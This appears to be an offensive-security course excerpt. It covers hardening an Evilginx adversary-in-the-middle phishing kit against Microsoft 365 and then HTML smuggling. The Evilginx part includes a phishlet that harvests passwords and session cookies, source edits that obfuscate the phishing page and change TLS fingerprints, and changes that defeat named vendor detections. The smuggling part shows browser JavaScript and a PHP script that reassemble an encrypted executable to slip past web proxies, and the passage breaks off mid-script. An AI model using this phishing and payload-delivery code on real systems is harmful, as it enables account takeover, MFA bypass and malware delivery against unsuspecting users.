  - { phish_sub: 'sso-prod', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'

```

## Wildcard Certificate
Recall that Evilginx automatically issued SSL certificates for all subdomains in the previous module. This led to the inadvertent exposure of our subdomains through Certificate Transparency logs. Luckily for us, the new Evilginx version makes custom certificate deployment easy. In this section, we will generate a wildcard certificate to prevent the exposure of our subdomains.To create a Let's Encrypt wildcard certificate, use the commands below:
```
# Generate wildcard cert
sudo certbot certonly --manual --preferred-challenges=dns -d '*.domain.com'

# Optional: Generate wildcard cert and a cert for the primary domain
# sudo certbot certonly --manual --preferred-challenges=dns -d '*.domain.com' -d domain.com

```
Once the DNS challenge has been completed and you've setup the `TXT` record, Certbot will issue the certificate. Create a directory under `~/.evilginx/crt/sites` named `o365`.
```
cd ~/.evilginx/crt/sites

mkdir o365 && cd o365

```
Move the certificate and private key to the target directory. Note: `/etc/letsencrypt/live/<site>` contains symbolic links pointing to the actual files in `/etc/letsencrypt/archive/<site>`, therefore copy directly from the archive directory.
```
cp /etc/letsencrypt/archive/realaccentstest.com/fullchain1.pem fullchain.pem

cp /etc/letsencrypt/archive/realaccentstest.com/privkey.pem privkey.pem

```
Next, launch Evilginx and disable automatic certificate generation using the `config autocert off` command before enabling the phishlet. If configured correctly, Evilginx will use the certificate instead of generating a certificate for each subdomain.As expected with wildcard certificates, there is significantly less scanner activity compared to when a separate certificate was issued for each subdomain.
## Frontend Obfuscation
Another opsec issue we face with the current Evilginx setup is the lack of frontend obfuscation. If we right-click and select "View Page Source", there are various indicators that can result in our frontend being automatically detected via scanners.This course presented several modules that discussed obfuscation where one of the simplest methods was Base64 encoding. Therefore, we will modify the Evilginx source code again and Base64 encode the HTML body prior to returning it to the client. It will result in the frontend appearing the format below:
```
<script>document.write(decodeURIComponent(atob('HTML HERE')));</script>

```
To do so, we must modify the `core/http_proxy.go` file, specifically the lines shown below.
```
if stringExists(mime, []string{"text/html"}) { // Line 1154

    if pl != nil && ps.SessionId != "" {
        s, ok := p.sessions[ps.SessionId]
        if ok {
            if s.PhishLure != nil {
                // inject opengraph headers
                l := s.PhishLure
                body = p.injectOgHeaders(l, body)
            }

            var js_params *map[string]string = nil
            if s, ok := p.sessions[ps.SessionId]; ok {
                js_params = &s.Params
            }
            //log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
            js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
            if err == nil {
                body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
            }

            log.Debug("js_inject: injected redirect script for session: %s", s.Id)
            body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
        }
    }
}

```
The previous lines will be updated to be as follows:
```
if stringExists(mime, []string{"text/html"}) {

    if pl != nil && ps.SessionId != "" {
        s, ok := p.sessions[ps.SessionId]
        if ok {
            if s.PhishLure != nil {
                // inject opengraph headers
                l := s.PhishLure
                body = p.injectOgHeaders(l, body)
            }

            var js_params *map[string]string = nil
            if s, ok := p.sessions[ps.SessionId]; ok {
                js_params = &s.Params
            }
            //log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
            js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
            if err == nil {
                body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
            }

            log.Debug("js_inject: injected redirect script for session: %s", s.Id)
            body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
        }
    }

    ///////////////////////////////////////// NEW /////////////////////////////////////////
    encodedBody := base64.StdEncoding.EncodeToString(body)
    body = []byte(fmt.Sprintf("<script>document.write(decodeURIComponent(atob('%s')));</script>", encodedBody))
    ///////////////////////////////////////// NEW /////////////////////////////////////////
}

```
Save the file and recompile Evilginx again using `go build .`. Access the previously created lure and view page source to verify it's successfully obfuscated.
### Find and Replace
Evilginx has an inherent functionality that allows you to perform string substitution via the phishlet's `sub_filters` key. As described in the documentation: This section describes all string substitution filters that you can define to dynamically modify the proxied website's content. This will be important for replacing all occurrences of legitimate website's URLs with phishing proxy URLs, in order to prevent the browser from redirecting the visitor to legitimate website, before they can finish the authentication process. Filters can also be useful for removing or modifying Javascript anti-phishing security measures.The example provided in the documentation is shown below.
```
sub_filters:
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

```

#### strings.Replace
However, if you've opted to obfuscate the frontend from the server side, the `sub_filters` technique may not function as expected. Therefore, to perform find and replace, we need to modify the source code again. To perform a controlled number of find-and-replace operations, we can use the `strings.Replace` function, which accepts four parameters:
Source string – The original string where replacements will be made. If working with a byte slice, it should be converted to a string first.

- Old string – The substring that needs to be replaced.

- New string – The replacement substring.

- Number of replacements – Specifies how many occurrences of the old string should be replaced. Setting this to `1` replaces only the first occurrence, while higher values control the exact number of replacements. Using `-1` replaces all occurrences.

```
body = []byte(strings.Replace(string(body), "Sign in to your account", "Don't Sign in!", 1))

```

#### strings.ReplaceAll
To replace all occurrences of a substring within a string, we can use the `strings.ReplaceAll` function, which simplifies the process by automatically replacing every instance of the specified substring.

- Source string – The original string where replacements will be made. If working with a byte slice, it should be converted to a string first.

- Old string – The substring that needs to be replaced.

- New string – The replacement substring.

Since `strings.ReplaceAll` replaces all occurrences by default, there is no need to specify the number of replacements.

```
body = []byte(strings.ReplaceAll(string(body), "Sign in to your account", "Don't Sign in!"))

```

#### Usage Example
For example, in the code below, before obfuscating the frontend HTML, we will find and replace a single instance of "Sign in to your account" with "Don't Sign in!". The code snippet being modified is the same one we previously modified inside `core/http_proxy.go`.

```
if stringExists(mime, []string{"text/html"}) { // Line 1154

    if pl != nil && ps.SessionId != "" {
        s, ok := p.sessions[ps.SessionId]
                    if ok {
                        if s.PhishLure != nil {
                            // inject opengraph headers
                            l := s.PhishLure
                            body = p.injectOgHeaders(l, body)
                        }

                        var js_params *map[string]string = nil
                        if s, ok := p.sessions[ps.SessionId]; ok {
                            js_params = &s.Params
                        }
                        //log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
                        js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
                        if err == nil {
                            body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_i>
                        }

                        ///////////////////////////////////////// NEW /////////////////////////////////////////
                        body = []byte(strings.Replace(string(body), "Sign in to your account", "Don't Sign in!", 1))
                        ///////////////////////////////////////// NEW /////////////////////////////////////////

                        log.Debug("js_inject: injected redirect script for session: %s", s.Id)
                        body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
                    }
                }

                ///////////////////////////////////////// Obfuscation /////////////////////////////////////////
                encodedBody := base64.StdEncoding.EncodeToString(body)
                body = []byte(fmt.Sprintf("<script>document.write(atob('%s'));</script>", encodedBody))
                ///////////////////////////////////////// Obfuscation /////////////////////////////////////////
            }

```
The image below shows the updated website title along with the successful frontend obfuscation.

## JavaScript Injection
We can also inject JavaScript by modifying the phishlet to make changes to the page dynamically. For example, the updated O365 phishlet below contains the `js_inject` key which injects JavaScript to modify the title of the website.

```
name: 'Microsoft 365'
author: 'Jan Bakker'
min_ver: '3.1.0'
proxy_hosts:
  - {phish_sub: 'auth-prod', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'uniquecdn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - { phish_sub: 'sso-prod', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
    type: 'cookie'
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password|accesspass)'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mfaAuthMethod'
      search: '(.*)'
      type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["*"]
    script: |
      function modifyTitle() {
          document.title = 'Custom login title';
      }
      document.addEventListener('DOMContentLoaded', modifyTitle);

```

### Favicon Modification
JavaScript injection can also modify the O365 phishet's favicon, but Microsoft's login page dynamically resets the favicon when modified through scripts from `aadcdn.msauth.net`, which are essential and cannot be blocked. To counter this, we create a function `enforceFavicon` which continuously monitors the favicon every 500 milliseconds and resets it to our custom icon if it changes.

Update the `js_inject` key in the phishlet to be as follows:

```
...
...

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["*"]
    script: |
      function enforceFavicon() {
          const customIcon = "https://mrd0x.com/favicon-32x32.png?v=005b9682391e5c2f9d941912ae173954";
          setInterval(() => {
              let favicon = document.querySelector('link[rel="shortcut icon"], link[rel="icon"]');
              if (favicon && favicon.href !== customIcon) {
                  favicon.href = customIcon;
              }
          }, 500);
      }

      document.addEventListener('DOMContentLoaded', enforceFavicon);

```

NOTE: Although we changed the title and favicon dynamically, it's recommended to change them statically instead.

## JA3/JA3S/JA4+ Fingerprint
The JA3/JA3S/JA4+ fingerprint of Evilginx can be an indicator that causes the server to be detected. Modifying the JA4/JA4S fingerprint will also modify the JA3/JA3S fingerprint, therefore we will only focus on JA4+. To change the fingerprint we will need to make additional changes to the Evilginx source code.

NOTE: The Go TLS package does not support customizing TLS ciphers for TLS 1.3, therefore we are choosing TLS 1.2.

core/config.go

First, import `crypto/tls` in the `core/config.go` file.

```
import (
        "crypto/tls" // NEW
        "fmt"
        "net/url"
        "os"
        "path/filepath"
        "strings"

        "github.com/kgretzky/evilginx2/log"

        "github.com/spf13/viper"
)

```
Next, modify the `GeneralConfig` structure to include `TLSMinVersion`, `TLSMaxVersion`, and `CipherSuites`.

```
type GeneralConfig struct {
    Domain       string   `mapstructure:"domain" json:"domain" yaml:"domain"`
    OldIpv4      string   `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
    ExternalIpv4 string   `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
    BindIpv4     string   `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
    UnauthUrl    string   `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
    HttpsPort    int      `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
    DnsPort      int      `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
    Autocert     bool     `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
    CipherSuites []uint16 `mapstructure:"cipher_suites" json:"cipher_suites" yaml:"cipher_suites"` // NEW
    TLSMinVersion uint16   `mapstructure:"tls_min_version" json:"tls_min_version" yaml:"tls_min_version"` // NEW
    TLSMaxVersion uint16   `mapstructure:"tls_max_version" json:"tls_max_version" yaml:"tls_max_version"` // NEW
}

```
Add the following lines to enable two cipher suites and set the minimum and maximum TLS version to be TLS 1.2. Feel free to uncomment the additional cipher suites or change them to a different set of cipher suites.

```
func NewConfig(cfg_dir string, path string) (*Config, error) {
        c := &Config{
                ...
                ...
                ...
        }

        ////// ADD THE CODE BELOW //////
        c.general.CipherSuites = []uint16{
          // tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, // Uncomment to enable this cipher suite
          // tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,   // Uncomment to enable this cipher suite
          // tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, // Uncomment to enable this cipher suite
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
        }

        // TLS Versions
        c.general.TLSMinVersion = tls.VersionTLS12
        c.general.TLSMaxVersion = tls.VersionTLS12
...
...

```
core/http_proxy.go

Open the `core/http_proxy.go` file for editing and search for the `TLSConfigFromCA` function and replace it with the function below. The updated function uses the updated TLS configurations, ensuring it uses the customized TLS version and cipher suites defined in the `config.go` file.

```
func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
        return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
                parts := strings.SplitN(host, ":", 2)
                hostname := parts[0]
                port := 443
                if len(parts) == 2 {
                        port, _ = strconv.Atoi(parts[1])
                }

                tls_cfg := &tls.Config{
                    CipherSuites:             p.cfg.general.CipherSuites,
                    PreferServerCipherSuites: false,
                    MinVersion:               p.cfg.general.TLSMinVersion,
                    MaxVersion:               p.cfg.general.TLSMaxVersion,
                }
                if !p.developer {

                        tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
                        tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.Nex>

                        return tls_cfg, nil
                } else {
                        var ok bool
                        phish_host := ""
                        if !p.cfg.IsLureHostnameValid(hostname) {
                                phish_host, ok = p.replaceHostWithPhished(hostname)
                                if !ok {
                                        log.Debug("phishing hostname not found: %s", hostname)
                                        return nil, fmt.Errorf("phishing hostname not found")
                                }
                        }
                        cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
                        if err != nil {
                                log.Error("http_proxy: %s", err)
                                return nil, err
                        }
                        return &tls.Config{
                                InsecureSkipVerify: true,
                                Certificates:       []tls.Certificate{*cert},
                                CipherSuites:       p.cfg.general.CipherSuites,
                                PreferServerCipherSuites: false,
                                MinVersion:         p.cfg.general.TLSMinVersion,
                                MaxVersion:         p.cfg.general.TLSMaxVersion,
                        }, nil
                }
        }
}

```
Recompile Evilginx, and test the JA4/JA4S fingerprints.

### JA4+ Fingerprint: Before and After

- Capturing the JA4S fingerprint prior to modifying Evilginx, reveals that the fingerprint is known and listed as "Sliver malware".

- Capturing the JA4 fingerprint prior to modifying Evilginx also reveals that the fingerprint is known and listed as "Sliver malware".

- After updating the TLS configuration, the JA4S and JA4 fingerprints have been modified.

## Origin Proxy
When Evilginx is used to reverse proxy an external website, it requests content from the website as if it were the user. This action reveals the IP address of the Evilginx server to the external website, which could lead to its detection and blocking by defenders. To mitigate this risk, Evilginx can be configured to route all its traffic through a proxy server. Conveniently, Evilginx includes built-in support for proxying. For our setup, we are utilizing Proxymesh as our proxy service.

In the image below, the Evilginx server is using a proxy which is the one communicating with the target server, which in this case is Microsoft.

Enter the following Evilginx commands to setup the proxy connection and restart Evilginx after enabling the proxy. Ensure you replace the values in brackets with your proxy's values.

```
proxy type <http/socks>

proxy address <host/ip>

proxy port <port>

proxy username <username>

proxy password <password>

proxy enable

```

After restarting Evilginx, enter the `proxy` command to ensure it is enabled. This will route all traffic through the designated proxy.

## Lure Cookie Identifier
An interesting approach to detecting Evilginx, as disclosed by @rad9800 and implemented by Push Security, involves fingerprinting the cookie name and value generated by Evilginx when a user interacts with the phishing lure. As illustrated below, the cookie name adheres to the `xxxx-xxxx` format, while the cookie value typically comprises a 64-character hexadecimal string, both of which are indicators of Evilginx.

Restarting Evilginx will change the values, but the format is consistent.

The specific function that detects the cookie name and value is shown below.

```
function m() {
  const t = /^[a-f0-9]{4}-[a-f0-9]{4}$/i,
    e = /^[a-f0-9]{64}$/i;
  for (const [n, o] of u)
    if (t.test(n) && e.test(o))
      return (l = !0), void r("AITM_TOOL_EVILGINX_01");
}

```

### Modifying Cookie Name
To evade this detection mechanism, we will modify the Evilginx source code to change the format of the cookie name and value. The cookie name generation function is found inside `core/http_proxy.go` and is shown below.

```
func getSessionCookieName(pl_name string, cookie_name string) string {
        hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
        s_hash := fmt.Sprintf("%x", hash[:4])
        s_hash = s_hash[:4] + "-" + s_hash[4:]
        return s_hash
}

```

We simply need to modify the function to break the detectable format. In the updated `getSessionCookieName` function, we remove the `xxxx-xxxx` pattern by generating a continuous hexadecimal string instead of inserting a hyphen. This adjustment helps evade detection by altering the cookie name structure while maintaining uniqueness.

```
func getSessionCookieName(pl_name string, cookie_name string) string {
    hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
    s_hash := fmt.Sprintf("%x", hash[:6])
    return s_hash
}

```

### Modifying Cookie Value
Next, we must change the format of our cookie value which is also fingerprinted. The cookie value generation function is found inside `core/utils.go` and is shown below.

```
func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

```

Again, we need to modify the function to break the detectable format. In the updated `GenRandomToken` function, we insert hyphens between every eight-character segment of the hashed output, altering the structure of the session token to avoid detection while maintaining uniqueness and randomness.

```
func GenRandomToken() string {
    rdata := make([]byte, 64)
    rand.Read(rdata)
    hash := sha256.Sum256(rdata)
    token := fmt.Sprintf("%x", hash)
    modifiedToken := token[:8] + "-" + token[8:16] + "-" + token[16:24] + "-" + token[24:32]
    return modifiedToken
}

```
Compile Evilginx and make a request to the lure to verify that the cookie fingerprint has been successfully changed.

## JavaScript File Name
It's worth noting that by modifying the `GenRandomToken` function, we also disrupted another detection mechanism used by Push Security. Specifically, the code below searches for a JavaScript file with a name that follows the pattern `/s/[64_hex_characters].js`. If such a file is found and its content length is `0`, it triggers alerts. By changing the format of generated script filenames, we effectively prevent them from matching the expected pattern, thereby bypassing this detection method.

```
async function _() {
  const t = /^\/s\/[a-fA-F0-9]{64}\.js$/,
    e = [];
  for (const n of document.scripts) {
    const r = n.getAttribute("src");
    r && t.test(r) && e.push(fetch(r, { method: "HEAD" }));
  }
  for (const n of await Promise.allSettled(e))
    if ("fulfilled" === n.status && n.value.ok) {
      const t = n.value.headers.get("content-length");
      if (null === t || "0" === t) {
        r("AITM_TOOL_EVILGINX_02");
        if (l) {
          r("AITM_TOOL_EVILGINX_03");
        }
        break;
      }
    }
}

```

## HTTP Fingerprint
The final aspect we will briefly discuss is detection through HTTP fingerprinting. Evilginx's HTTP responses can potentially be identified based on unique characteristics in the headers and their order. One way to mitigate this is by using a redirector in front of the Evilginx server—an approach that is already recommended for operational security.

We've previously covered the setup of redirectors, and this article by Jack Button details how to configure Cloudflare and a redirector with Evilginx. Therefore, we will not be covering it in this module.

## Conclusion
In this module, we made extensive modifications to Evilginx, yet some known and unknown fingerprints may still lead to its detection. However, the operational security changes introduced here have significantly lowered the likelihood of detection. Future modules will explore additional modifications to further eliminate fingerprints and minimize detection risks.

It's worth mentioning that a commercial Evilginx version is available which already includes the modifications presented in this module and more.

## References

- Evilginx2-Phishlets

- Evilginx-Phishing-Infra-Setup

## Objectives
Use a dynamic obfuscation technique instead of Base64 obfuscation

Setup a redirector in front of the Evilginx server and check the JA4/JA4S fingerprints

Inject JavaScript to autofill the target user's email based on a query parameter


---

# Módulo 80 — HTML Smuggling

Módulo 80 — HTML Smuggling

# Disclaimer

## Introduction
HTML smuggling is a widely used technique for evading web proxies and delivering malicious payloads. It works by using JavaScript to encode and store the payload in the browser, then locally decoding it back to its original form. Due to its effectiveness, HTML smuggling has recently seen an increase in usage by attackers.

This module will cover how web proxies function, how HTML smuggling bypasses them, and how to perform an HTML smuggling attack.

## Web Proxies
Organizations commonly use web proxies or web content filters to restrict access to certain websites and enforce security policies. These proxies can also prevent users from downloading specific file types that pose security risks by inspecting web traffic and blocking files based on their MIME type, file extension, or other signatures.

However, HTML smuggling is a technique that circumvents these protections by embedding a malicious payload—such as a `.exe` file—directly within an HTML document using JavaScript. Because the web proxy only inspects the transmitted web content, which appears as harmless HTML and JavaScript, it does not detect the presence of an actual file payload.

Once the HTML and JavaScript are executed within the user's browser, the malicious file is reconstructed and written to disk without triggering traditional network-based security measures. Since the proxy does not analyze the file’s final form after it is assembled in the browser, HTML smuggling effectively bypasses web content filtering and network security controls.

The diagram below from Outflank's blog illustrates the aforementioned process.

## Blob API
A critical part of HTML smuggling is the JavaScript Blob API which must be understood prior to understanding HTML smuggling. A JavaScript Blob is a data type that represents raw binary data, allowing developers to handle files and other binary content in memory. A blob can be created using the constructor below:

```
new Blob(blobParts, options);

```
Where `blobParts` is an array of data (e.g. strings, Buffers, or other Blobs) and `options` specifies metadata like MIME type.

For example, the code below creates a Blob containing an HTML snippet. The `blobParts` array holds the HTML string, and the Blob constructor generates a Blob object with a MIME type of `text/html`, allowing it to be treated as an HTML file when accessed or downloaded. This Blob can then be converted into a URL and used to display or save the content dynamically in a web application.

```
const blobParts = ['<span id="b">Maldev Academy is the best!</span>'];
const blob = new Blob(blobParts, { type: "text/html" });

```

### Creating a URL From a Blob
Once a Blob is constructed, we can then use `URL.createObjectURL()` to convert the blob to a URL. The blob URL will have a format that looks like `blob:<domain>/<uuid>`. Each URL generated by `URL.createObjectURL()` is stored internally by the browser as a URL-to-Blob mapping. A generated URL remains valid only within the current window while it is open; once the window is closed, the URL is destroyed. The URL can be used in `<img>`, `<a>`, or any other element that requires a URL reference.

The updated code below will generate a URL for the blob and print it to the console.

```
const blobParts = ['<span id="b">Maldev Academy is the best!</span>'];
const blob = new Blob(blobParts, { type: "text/html" });

// Create a URL from the blob
const url = URL.createObjectURL(blob);

// Print the URL to the console
console.log(url);

```

If we access this URL, it will show the HTML content stored in the Blob rendered in the browser. Since the Blob contains an HTML snippet, the browser will interpret and display it as a webpage, just like a regular HTML file. This technique allows JavaScript to generate and manipulate content dynamically without needing an external file or server.

### Revoking Blob URL
As previously mentioned, the Blob URL will remain active as long as the window is open. However, if a Blob URL is no longer needed, it can be revoked using the `URL.revokeObjectURL()` function.

```
const blobParts = ['<span id="b">Maldev Academy is the best!</span>'];
const blob = new Blob(blobParts, { type: "text/html" });

// Create a URL from the blob
const url = URL.createObjectURL(blob);

// Print the URL to the console
console.log(url);

// Revoke the URL
URL.revokeObjectURL(url);

```
Calling `URL.revokeObjectURL(url)` immediately after creating the Blob URL in this example invalidates the URL before it can be used. In real-world scenarios, the `URL.revokeObjectURL(url)` function should be called after the Blob URL has served its purpose, such as after downloading a file or displaying content. Therefore, the code should look more like this:

```
const blobParts = ['<span id="b">Maldev Academy is the best!</span>'];
const blob = new Blob(blobParts, { type: "text/html" });

// Create a URL from the blob
const url = URL.createObjectURL(blob);

// DO SOMETHING WITH THE URL e.g. trigger a download //
// ...
// ...
// URL usage is completed, URL is no longer needed //

// After triggering the download, revoke the URL
URL.revokeObjectURL(url);

```

## Smuggling Binary Files
Smuggling binary files follows the same approach as the previous section, but a key difference is that binary files must be encoded because they contain characters that cannot be represented in plain text formats. The code below is a slightly modified version from Outflank's blog to enhance readability.

The code takes a Base64-encoded binary file, decodes it into raw binary using the `base64ToArrayBuffer` function, and then creates a `Blob` object to store the binary data. A Blob URL is generated using `URL.createObjectURL(blob)`, which acts as a temporary link to the file. A hidden `<a>` element is then dynamically created, with its `href` attribute set to the Blob URL and its `download` attribute set to `7zip.exe`, triggering an automatic download when clicked. Finally, `URL.revokeObjectURL(url)` is called to free up memory by removing the Blob URL mapping once the download is initiated.

Note: Replace the Base64 inside the `file` variable. You can Base64 encode a file and remove line breaks in Linux using `base64 file.exe | tr -d '\n' > file.b64`.

```
<html>
    <body>
        <script>
            // Function to convert Base64 to Array buffer
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // Convert binary file to blob
            var file = 'TVqQAAMAAAA...'; // Base64 of the binary file
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});

            // Create the blob URL
            var url = window.URL.createObjectURL(blob);

            // Dynamically create an <a> element and set the href attribute to the blob url
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            a.href = url;

            // Set the download attribute to the file name and simulate a click on the <a> element
            // This will trigger the download of 7zip.exe
            var fileName = '7zip.exe';
            a.download = fileName;
            a.click();

            // Revoke Blob URL
            window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>

```
The video can be found in folder: `./videos/smuggle.mov`

## Improve Smuggling Binary Files (1)
The previous template is highly recognizable and easily flagged as HTML smuggling. Additionally, using static Base64 encoding makes it more detectable, as the encoded binary itself can be identified by signature-based detection systems. Therefore, we will improve this by using a server-side PHP script to apply dynamic XOR encryption to the binary file.

### XOR Encrypt & Hexadecimal Encoding
To start, ensure the binary file is placed outside of the document root. For our example, we've placed `7zip.exe` outside our document root, `/var/www/html`. The first part of our PHP script reads the binary file, generates a random encryption key, and applies an XOR operation to obfuscate its contents. The encrypted data is then converted into a hexadecimal string.

```
<?php

$filePath = '/var/www/7zip.exe';
$binaryData = file_get_contents($filePath);
$key = bin2hex(random_bytes(16));

function xorEncryptDecrypt($input, $key) {
    $output = '';
    $keyLength = strlen($key);
    $keyIndex = 0;

    for ($i = 0; $i < strlen($input); $i++) {
        $byte = ord($input[$i]);
        $keyByte = ord($key[$keyIndex]);
        $xorByte = $byte ^ $keyByte;
        $output .= chr($xorByte);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    return $output;
}

$encryptedData = xorEncryptDecrypt($binaryData, $key);
$hexEncoded = bin2hex($encryptedData);

...
...

```

### Reconstructing and Smuggling Binary File
The following component of the script generates an HTML response containing a JavaScript function to decrypt a hex-encoded string embedded within the page. The hex-encoded data is retrieved from the `<div id="hiddenData">` element and passed to the XOR decryption function, `xorDecrypt`, along with the dynamic key.

The `xorDecrypt` function first converts the hex-encoded string back into a binary string. It then applies the XOR operation using the dynamic key to reconstruct the original data. Once decrypted, the binary data is converted into a `Uint8Array`, which is used to create a `Blob`. A Blob URL is generated and assigned to the `href` attribute of the `blobElement`, allowing it to be triggered for download.

```
...
...

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let hexEncoded = document.getElementById('hiddenData').textContent;
            function xorDecrypt(hexEncoded, key) {
                // Decode the hex
                let binString = '';
                for (let i = 0; i < hexEncoded.length; i += 2) {
                    binString += String.fromCharCode(parseInt(hexEncoded.substr(i, 2), 16));
                }

                // Decode XOR using the dynamic key
                let keyIndex = 0;
                let output = '';
                for (let i = 0; i < binString.length; i++) {
                    let decryptedByte = binString.charCodeAt(i) ^ key.charCodeAt(keyIndex);
                    output += String.fromCharCode(decryptedByte);
                    keyIndex = (keyIndex + 1) % key.length;
                }

                // Convert decrypted string to byte array
                const bytes = new Uint8Array(output.length);
                for (let i = 0; i < output.length; i++) {
                    bytes[i] = output.charCodeAt(i);
                }

                const blob = new Blob([bytes], { type: 'octet/stream' });
                const blobUrl = URL.createObjectURL(blob);
                const dlLink = document.getElementById('blobElement');
                dlLink.href = blobUrl;
                dlLink.click();
            }

            const key = '$key';
            xorDecrypt(hexEncoded, key);
        });
    </script>
</head>
<body>
    <div id="hiddenData" style="display:none;">$hexEncoded</div>
    <a href="" download="7zip.exe" style="visibility:hidden" id="blobElement">View</a>
</body>
</html>
HTML;
?>

```

### Complete Code
The fully updated PHP script implementing HTML smuggling is shown below.

```
<?php

$filePath = '/var/www/7zip.exe';
$binaryData = file_get_contents($filePath);
$key = bin2hex(random_bytes(16));

function xorEncryptDecrypt($input, $key) {
    $output = '';
    $keyLength = strlen($key);
    $keyIndex = 0;

    for ($i = 0; $i < strlen($input); $i++) {
        $byte = ord($input[$i]);
        $keyByte = ord($key[$keyIndex]);
        $xorByte = $byte ^ $keyByte;
        $output .= chr($xorByte);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    return $output;
}

$encryptedData = xorEncryptDecrypt($binaryData, $key);
